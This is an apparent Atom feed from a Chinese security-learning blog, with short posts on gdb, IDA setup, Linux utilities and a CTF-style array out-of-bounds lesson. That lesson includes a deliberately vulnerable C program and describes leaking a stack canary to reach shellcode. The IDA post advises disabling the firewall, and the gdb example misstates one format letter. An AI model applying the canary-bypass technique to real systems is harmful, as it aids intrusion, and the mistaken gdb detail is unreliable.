<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>技术栈</title>
  
  <subtitle>Share station</subtitle>
  <link href="https://www.rgzzplus.com/atom.xml" rel="self"/>
  
  <link href="https://www.rgzzplus.com/"/>
  <updated>2022-09-06T06:30:21.673Z</updated>
  <id>https://www.rgzzplus.com/</id>
  
  <author>
    <name>rgzzplus</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>gdb中x的用法</title>
    <link href="https://www.rgzzplus.com/2022/09/06/gdb%E4%B8%ADx%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <id>https://www.rgzzplus.com/2022/09/06/gdb%E4%B8%ADx%E7%9A%84%E7%94%A8%E6%B3%95/</id>
    <published>2022-09-06T06:29:37.000Z</published>
    <updated>2022-09-06T06:30:21.673Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载自：<a href="https://www.jianshu.com/p/589308dd36dc">gdb ---- x命令详解</a></p><p>作者：Adam_0<br>链接：<a href="https://www.jianshu.com/p/589308dd36dc">https://www.jianshu.com/p/589308dd36dc</a><br>来源：简书</p></blockquote><p>examine命令缩写为x<br>格式：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="language-xml">&lt;n/f/u&gt;</span>  &lt;addr&gt;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">n:是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，</span><br><span class="line">一个内存单元的大小由第三个参数u定义。</span><br><span class="line"></span><br><span class="line">f:表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</span><br><span class="line">  x 按十六进制格式显示变量.</span><br><span class="line">  d 按十进制格式显示变量。</span><br><span class="line">  u 按十进制格式显示无符号整型。</span><br><span class="line">  o 按八进制格式显示变量。</span><br><span class="line">  t 按二进制格式显示变量。</span><br><span class="line">  a 按十六进制格式显示变量。</span><br><span class="line">  c 按字符格式显示变量。</span><br><span class="line">  f 按浮点数格式显示变量。</span><br><span class="line">  i 指令地址格式</span><br><span class="line"></span><br><span class="line">u:就是指以多少个字节作为一个内存单元-unit,默认为<span class="number">4</span>。u还可以用被一些字符表示:</span><br><span class="line">  如b=<span class="number">1</span> <span class="built_in">byte</span>, h=<span class="number">2</span> bytes,w=<span class="number">4</span> bytes,g=<span class="number">8</span> bytes.</span><br><span class="line"></span><br><span class="line">&lt;addr&gt;:表示内存地址。</span><br><span class="line"><span class="function">Format letters are <span class="title">o</span>(<span class="params">octal</span>), <span class="title">x</span>(<span class="params">hex</span>), <span class="title">d</span>(<span class="params"><span class="built_in">decimal</span></span>), <span class="title">u</span>(<span class="params">unsigneddecimal</span>),</span></span><br><span class="line"><span class="function"><span class="title">t</span>(<span class="params">binary</span>), <span class="title">f</span>(<span class="params"><span class="built_in">float</span></span>), <span class="title">a</span>(<span class="params">address</span>), <span class="title">i</span>(<span class="params">instruction</span>), <span class="title">c</span>(<span class="params"><span class="built_in">char</span></span>) <span class="keyword">and</span> <span class="title">s</span>(<span class="params"><span class="built_in">string</span></span>).</span></span><br><span class="line"><span class="function">Size letters are <span class="title">b</span>(<span class="params"><span class="built_in">byte</span></span>), <span class="title">h</span>(<span class="params">halfword</span>), <span class="title">w</span>(<span class="params">word</span>), <span class="title">g</span>(<span class="params">giant, <span class="number">8b</span>ytes</span>)</span></span><br></pre></td></tr></table></figure><p><strong>举例:</strong><br>x/3uh buf<br>表示从内存地址buf读取内容，</p><p>3表示三个单位，<br>u表示按十六进制显示<br>h表示以双字节为一个单位</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文转载自：&lt;a href=&quot;https://www.jianshu.com/p/589308dd36dc&quot;&gt;gdb ---- x命令详解&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者：Adam_0&lt;br&gt;
链接：&lt;a href=&quot;https://www.jians</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>安全论坛and博客</title>
    <link href="https://www.rgzzplus.com/2022/09/05/%E5%AE%89%E5%85%A8%E5%AA%92%E4%BD%93or%E5%8D%9A%E5%AE%A2/"/>
    <id>https://www.rgzzplus.com/2022/09/05/%E5%AE%89%E5%85%A8%E5%AA%92%E4%BD%93or%E5%8D%9A%E5%AE%A2/</id>
    <published>2022-09-05T13:29:54.000Z</published>
    <updated>2022-09-05T13:46:48.958Z</updated>
    
    <content type="html"><![CDATA[<p>媒体：</p><ul><li><a href="https://www.cnblogs.com/">博客园</a></li><li><a href="https://bbs.pediy.com/">看雪</a></li><li><a href="https://www.blackhat.com/">blackhat</a></li><li><a href="https://www.bugku.com/forum.php">bugku</a></li><li><a href="http://www.icse-conferences.org/">ICSE</a></li><li><a href="https://geeknb.com/">极牛网</a></li><li><a href="https://bbs.kafan.cn/forum.php?mod=forumdisplay&amp;fid=7&amp;filter=typeid&amp;typeid=31">卡饭论坛</a></li><li><a href="https://www.freebuf.com/">FREEBUF</a></li><li><a href="https://blogsurf.io/">Blog Surf</a></li><li><a href="http://phrack.org/issues/60/10.html">PHRACK</a></li><li><a href="https://www.anquanke.com/">安全客</a></li><li><a href="https://packetstormsecurity.com/">packet_storm</a></li><li><a href="https://www.cnhackteam.org/">黑客世界论坛</a></li><li><a href="https://www.t00ls.com/">tools</a></li><li><a href="https://xz.aliyun.com/">先知社区</a></li></ul><p>靶场：</p><ul><li><a href="https://adworld.xctf.org.cn/home/index">攻防世界</a></li><li><a href="https://ctf.bugku.com/index.html">CTF-bugku</a></li><li><a href="https://www.ctfhub.com/#/index">CTFhub</a></li><li><a href="https://book.nu1l.com/tasks/">从0到1：CTFer成长之路</a></li><li><a href="https://www.exploit-db.com/">Exploit Database</a></li><li><a href="http://www.shell-storm.org/shellcode/">shell-storm</a></li><li><a href="https://www.kancloud.cn/alex_wsc/android/506821"><strong>Android</strong></a></li></ul><p>博客：</p><ul><li><a href="https://www.cnblogs.com/2014asm/category/1310367.html">我是小三</a> ——pwn</li><li><a href="https://www.cnblogs.com/LY613313">爱喝奶茶的沐沐</a> ——pwn</li><li><a href="https://www.giantbranch.cn/">giantbranch</a> ——fuzzing</li><li><a href="https://www.jarvisw.com/">Jarvis</a> ——pwn</li><li><a href="https://jvns.ca/">Julia Evans</a> ——大佬</li><li><a href="https://www.onctf.com/"> 骁隆 </a> ——pwn+web</li><li><a href="https://v0w.top/">V0W’s Blog</a> ——web</li><li><a href="https://www.cnblogs.com/linuxsec/">linuxsec</a> ——web</li><li><a href="http://blog.rchapman.org/">瑞安·A·查普曼</a> ——大佬</li><li><a href="https://sploitfun.wordpress.com/">sploitF-U-N</a> ——pwn</li><li><a href="https://strcpy.me/">virusdefender’s blog</a> ——pwn</li><li><a href="http://www.fuzzysecurity.com/index.html">模糊安全</a> ——大佬们</li></ul><blockquote><p>其它博客推荐文章：</p><p><a href="https://zhuanlan.zhihu.com/p/23701240">https://zhuanlan.zhihu.com/p/23701240</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;媒体：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/&quot;&gt;博客园&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://bbs.pediy.com/&quot;&gt;看雪&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://ww</summary>
      
    
    
    
    <category term="收藏夹" scheme="https://www.rgzzplus.com/categories/%E6%94%B6%E8%97%8F%E5%A4%B9/"/>
    
    
    <category term="论坛&amp;博客" scheme="https://www.rgzzplus.com/tags/%E8%AE%BA%E5%9D%9B-%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>查看linux内核版本</title>
    <link href="https://www.rgzzplus.com/2022/09/05/%E6%9F%A5%E7%9C%8Blinux%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC/"/>
    <id>https://www.rgzzplus.com/2022/09/05/%E6%9F%A5%E7%9C%8Blinux%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC/</id>
    <published>2022-09-05T13:28:04.000Z</published>
    <updated>2022-09-05T13:46:39.722Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载自：<a href="https://cloud.tencent.com/developer/article/1878840">Linux查看内核版本命令</a></p></blockquote><h2 id="使用uname命令查找linux内核"><a class="markdownIt-Anchor" href="#使用uname命令查找linux内核"></a> <strong>使用uname命令查找Linux内核</strong></h2><p>uname是用于获取系统信息的Linux命令。您也可以使用它来确定您使用的是32位还是64位系统。</p><p>打开一个终端并使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[linuxmi@linux:~/www.xxx.com]$ uname -r</span><br></pre></td></tr></table></figure><p>输出将类似于以下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.3</span><span class="number">.0</span>-<span class="number">28</span>-generic</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文转载自：&lt;a href=&quot;https://cloud.tencent.com/developer/article/1878840&quot;&gt;Linux查看内核版本命令&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;使用uname命令查找l</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="内核版本" scheme="https://www.rgzzplus.com/tags/%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>linux软件安装包依赖问题</title>
    <link href="https://www.rgzzplus.com/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/"/>
    <id>https://www.rgzzplus.com/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</id>
    <published>2022-09-05T13:27:21.000Z</published>
    <updated>2022-09-05T13:45:42.797Z</updated>
    
    <content type="html"><![CDATA[<p>当我首次使用pwndbg的heap指令的时候：<br><img src="/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/image-20220901192451610.png" alt="image-20220901192451610"></p><p>说是缺少依赖，需要我安装一些库文件</p><p>但是当我去安装这些库的时候却发生了依赖冲突<br><img src="/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/image-20220901192638567.png" alt="image-20220901192638567"></p><p>发现，是我的libc6，太新了，需要安装回旧版本的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install  libc6=2.31-0kylin9.2</span><br></pre></td></tr></table></figure><p>安装完旧版本的库后，就能安装 libc6-dbg 啦！<br><img src="/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/image-20220901192829669.png" alt="image-20220901192829669"></p><p>再去 heap，就能看到信息了<br><img src="/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/image-20220901193217714.png" alt="image-20220901193217714"></p><blockquote><p>参考：<a href="https://www.cnblogs.com/EasonJim/p/7144017.html">查看指定软件所有版本</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当我首次使用pwndbg的heap指令的时候：&lt;br&gt;
&lt;img src=&quot;/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="安装包依赖" scheme="https://www.rgzzplus.com/tags/%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96/"/>
    
  </entry>
  
  <entry>
    <title>数组越界访问</title>
    <link href="https://www.rgzzplus.com/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/"/>
    <id>https://www.rgzzplus.com/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/</id>
    <published>2022-09-05T13:27:08.000Z</published>
    <updated>2022-09-05T13:44:04.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-数组越界"><a class="markdownIt-Anchor" href="#1-数组越界"></a> 1 数组越界</h1><p>先区分一下<strong>数组越界漏洞</strong>和<strong>溢出漏洞</strong>：</p><ul><li>数组越界访问包含读写类型</li><li>溢出属于数据写入</li><li>部分溢出漏洞本质确实就是数组越界漏洞。</li></ul><p>数组越界就像是倒水的时候倒错了杯子，溢出就像是水从杯子里溢出来。</p><h2 id="11-原理"><a class="markdownIt-Anchor" href="#11-原理"></a> 1.1 原理</h2><p><strong>堆中</strong>的数组越界： 因为堆是我们自己分配的，如果越界会把堆中其他空间的数据写掉或着读取其他空间的数据。如果是变量则会引起数值改变，如果是指针则可能会引起crash。</p><p><strong>栈中</strong>的数组越界：因为栈是向下增长的，进入函数前，会把参数和下一条指令地址压栈，如果覆盖了当前函数的ebp（栈底），那么栈还原时esp（栈顶）就不正确指向，从而发送未知错误（大部分是程序崩溃退出），ebp后面的返回地址也被覆盖那么程序执行流程则可被控制。</p><p>下面代码为例分析数组越界访问漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[<span class="number">3</span>] = &#123;<span class="number">111</span>,<span class="number">222</span>,<span class="number">333</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入数组索引下标：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输出数组元素：array[%d] = %d\n&quot;</span>, index, <span class="built_in">array</span>[index]);</span><br><span class="line">    <span class="comment">//array[index] = 1;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行生成的程序，然后分别输入2 和 4 作为数组下标，输出结果如下，当输入的数组下标为 0、1、2 的时候，会得到正常数值，但是从索引3开始就超出了原来的数组 array 的范围，比如输入4，将会数组越界访问栈中的值，导致读取不在程序控制范围内的数值。</p><p><img src="/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/image-20220904162857184.png" alt="image-20220904162857184"></p><p>使用gdb调试发现array[4] 就是从 array 开始的第六个数据0x4012A9，已经读取到了array之外的数据，如果越界访问距离过大，就会访问到不可访问的内存空间，导致程序崩溃。</p><p>我们可以利用这种方式来取得栈上的 canary，进而绕过canary。</p><p><img src="/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/image-20220904162631275.png" alt="image-20220904162631275"></p><p><img src="/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/image-20220904162118330.png" alt="image-20220904162118330"></p><p>canary = 0x3dd8e70f8 =1037625103<sub>10</sub></p><p><img src="/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/image-20220904162735865.png" alt="image-20220904162735865"></p><p>这里我们已经取得了栈中 canary 的值，接下来只要通过栈溢出，进行覆盖，并把 canary 放入 [rbp-0x8] 就能控制程序去执行 shellcode 了。</p><p>0x9d5720fbb2e21300</p><blockquote><p>参数：</p><p>​<a href="https://bbs.pediy.com/thread-246490.htm">整数溢出+数组越界</a></p><p>​漏洞战争</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-数组越界&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-数组越界&quot;&gt;&lt;/a&gt; 1 数组越界&lt;/h1&gt;
&lt;p&gt;先区分一下&lt;strong&gt;数组越界漏洞&lt;/strong&gt;和&lt;strong&gt;溢出漏洞&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="数组越界" scheme="https://www.rgzzplus.com/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>IDA远程调试</title>
    <link href="https://www.rgzzplus.com/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    <id>https://www.rgzzplus.com/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</id>
    <published>2022-09-05T13:26:31.000Z</published>
    <updated>2022-09-05T13:43:24.310Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考：</p><p>​<a href="https://www.cnblogs.com/2014asm/p/10098005.html">linux漏洞分析入门笔记-栈溢出</a></p><p>​<a href="https://blog.csdn.net/u014101410/article/details/102853014">Windows下IDA远程调试Linux程序，无法连接</a></p></blockquote><blockquote><p>ida7.5</p><p>kylin v10</p></blockquote><h2 id="0x00环境配置"><a class="markdownIt-Anchor" href="#0x00环境配置"></a> 0x00:环境配置</h2><p>使用IDA远程调试Linux程序步骤如下：</p><p>\1. 在进行远程调试之前需要对Linux平台进行一些准备工作。在IDA的安装目录中的dbgsrv文件夹中，选择linux_server或者linux_serverx64复制到需要调试Linux程序所在的目录下。将复制过来的文件赋予执行权限chmod 777 linux_server*。执行该文件./linux_server或者./linux_server64。</p><p>\2. 在IDA中选择菜单Debugger-Run-Remote Linux debugger。如图。分别将程序所在位置，程序所在目录，参数（没有可不写），主机IP，主机端口，点击OK。相对路径路径要填写相对</p><p>linux_server或者linux_serverx64的相对路径。</p><p><img src="/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/693524-20181210175845721-2080206661.jpg" alt="img"></p><p>图1</p><p><img src="/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/693524-20181210180102331-1234975417.jpg" alt="img"></p><p>图2</p><p><img src="https://img2018.cnblogs.com/blog/693524/201812/693524-20181210180122795-1138987496.jpg" alt="img"></p><p>图3</p><p>\3. 此时，下关键函数下好断点后，即可进行动态调试，如下图：</p><p><img src="/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/693524-20181210180219408-1171249507.jpg" alt="img"></p><p>图4</p><p>常用快捷键包括：</p><p>a. 单步步过：F8</p><p>b. 单步步入：F7</p><p>c. 执行到光标位置：F4</p><p>d. 设置断点：F2</p><p>e. 顺序执行：F9</p><h2 id="0x01-问题"><a class="markdownIt-Anchor" href="#0x01-问题"></a> 0x01 问题</h2><p>您在远程调试过程中，可能出现能ping通，但就是连不上的情况，这可能是因为您开启了防火墙。</p><p>centos从7开始默认用的是firewalld，这个是基于iptables的，虽然有iptables的核心，但是iptables的服务是没安装的。所以你只要停止firewalld服务即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop firewalld.service &amp;&amp; sudo systemctl disable firewalld.service</span><br></pre></td></tr></table></figure><p>如果是其他的系统，在linux中关闭防火墙即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure><p>ubuntu或者centos都可以用以上方法解决，如果是kali的话，获取到ip，直接sudo执行linux_server即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&quot;https://www.cnblogs.com/2014asm/p/10098005.html&quot;&gt;linux漏洞分析入门笔记-栈溢出&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&quot;https://blo</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="IDA" scheme="https://www.rgzzplus.com/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>linux安装ida</title>
    <link href="https://www.rgzzplus.com/2022/09/05/linux%E5%AE%89%E8%A3%85ida/"/>
    <id>https://www.rgzzplus.com/2022/09/05/linux%E5%AE%89%E8%A3%85ida/</id>
    <published>2022-09-05T13:26:17.000Z</published>
    <updated>2022-09-05T13:42:51.734Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<strong><a href="https://github.com/AngelKitty/IDA7.0">安装IDA7.0</a></strong></p><p>以 Ubuntu18.04 为例。您可以将<a href="https://github.com/AngelKitty/IDA7.0/blob/master/idafree70_linux.run">idafree70_linux.run</a>下载到本地主机，然后使用以下命令安装 IDA。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/AngelKitty/IDA7.0.git</span><br><span class="line">cd IDA7.0/</span><br><span class="line">chmod +x idafree70_linux.run</span><br><span class="line">./idafree70_linux.run</span><br></pre></td></tr></table></figure><p>如果您之前没有安装过 git，可以运行以下命令来获取 git。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p>下载完成后，在该目录下打开命令行，并运行 <code>./ida</code> ，进入安装步骤。</p><p>然后您必须单击“下一步”才能完成安装。遇到安装目录解决方案时，建议更改默认路径，然后选择<code>/opt/...</code>IDA要安装的目录。</p><p>然后创建一个指向该<code>/usr/bin</code>文件夹的符号链接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /opt/idafree-7.0/ida64 /usr/bin</span><br></pre></td></tr></table></figure><p>然后你可以测试 ida64 命令，它应该可以工作。</p><p>也许你遇到了“Package ‘libstdc++.so.5’ has no installation Candidate”这样的问题，可以运行以下命令来解决。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libstdc++5:i386</span><br></pre></td></tr></table></figure><p>然后你就可以开始你的ida之旅了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;strong&gt;&lt;a href=&quot;https://github.com/AngelKitty/IDA7.0&quot;&gt;安装IDA7.0&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以 Ubuntu18.04 为例。您可以将&lt;a href=&quot;https://github.co</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="IDA" scheme="https://www.rgzzplus.com/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>查看glibc版本号</title>
    <link href="https://www.rgzzplus.com/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/"/>
    <id>https://www.rgzzplus.com/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/</id>
    <published>2022-09-05T13:26:04.000Z</published>
    <updated>2022-09-05T13:34:31.809Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载于：<a href="https://www.cnblogs.com/motadou/p/4473966.html">glibc查看版本号</a></p></blockquote><p>glibc是标准C库的GNU实现。我们采用C/C++所写的程序，运行时基本都依赖与它。如果我们想看当前机器glibc的源代码，首先需要知道当前机器glibc的版本号，然后到glibc的官网下载对应版本的源代码。</p><h3 id="查看当前机器glibc的版本号"><a class="markdownIt-Anchor" href="#查看当前机器glibc的版本号"></a> 查看当前机器glibc的版本号</h3><p>第一种方法：使用命令ldd，查看可执行程序依赖libc的路径。<br><img src="/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/47736-20200424135401650-138960923.png" alt="img"><br>由上可知，系统采用的是libc-2.19.so的动态库，那么glibc的版本号是2.19。</p><p>第二种方法：执行libc.so查看输出的glibc编译信息，里面包含了版本号。<br><img src="/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/47736-20200427101256592-1321326922.png" alt="img"></p><p>第三种方法：使用命令 ldd --version（ldd是glibc提供的命令，由此可知glibc的版本号）。<br><img src="/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/47736-20200424135802159-1955290017.png" alt="img"></p><p>第四种方法：使用命令 getconf GNU_LIBC_VERSION。<br><img src="/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/47736-20200424140519131-472352609.png" alt="img"></p><blockquote><p>下载glibc源代码</p><p>glibc官网地址：<a href="https://www.gnu.org/software/libc/">https://www.gnu.org/software/libc/</a><br>glibc源代码包：<a href="https://ftp.gnu.org/gnu/glibc/">https://ftp.gnu.org/gnu/glibc/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文转载于：&lt;a href=&quot;https://www.cnblogs.com/motadou/p/4473966.html&quot;&gt;glibc查看版本号&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;glibc是标准C库的GNU实现。我们采用C/C+</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="glibc版本号" scheme="https://www.rgzzplus.com/tags/glibc%E7%89%88%E6%9C%AC%E5%8F%B7/"/>
    
  </entry>
  
  <entry>
    <title>Linux查看系统进程</title>
    <link href="https://www.rgzzplus.com/2022/09/05/Linux%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/"/>
    <id>https://www.rgzzplus.com/2022/09/05/Linux%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/</id>
    <published>2022-09-05T13:25:27.000Z</published>
    <updated>2022-09-05T13:33:47.013Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载于：<a href="https://cloud.tencent.com/developer/article/1711858">LINUX查看进程的4种方法(小结)</a></p><p>进程是在 CPU 及内存中运行的程序代码，而每个进程可以创建一个或多个进程（父子进程）。</p><p><strong>查看进程方法：</strong></p><p><strong>第一种：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure><p>**ps命令用于报告当前系统的进程状态。**可以搭配kill指令随时中断、删除不必要的程序。ps命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。</p><p>a：显示当前终端下的所有进程信息，包括其他用户的进程。</p><p>u：使用以用户为主的格式输出进程信息。</p><p>x：显示当前用户在所有终端下的进程。</p><p>示例：</p><p><img src="/2022/09/05/Linux%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/1620.png" alt="img"></p><p><strong>上图中各字段解释：</strong></p><p>USER：启动该进程的用户账号名称 PID：该进程的ID号，在当前系统中是唯一的 %CPU：CPU占用的百分比 %MEM：内存占用的百分比</p><p>VSZ：占用虚拟内存（swap空间）的大小 RSS：占用常驻内存（物理内存）的大小</p><p>TTY：该进程在哪个终端上运行。“？”表未知或不需要终端 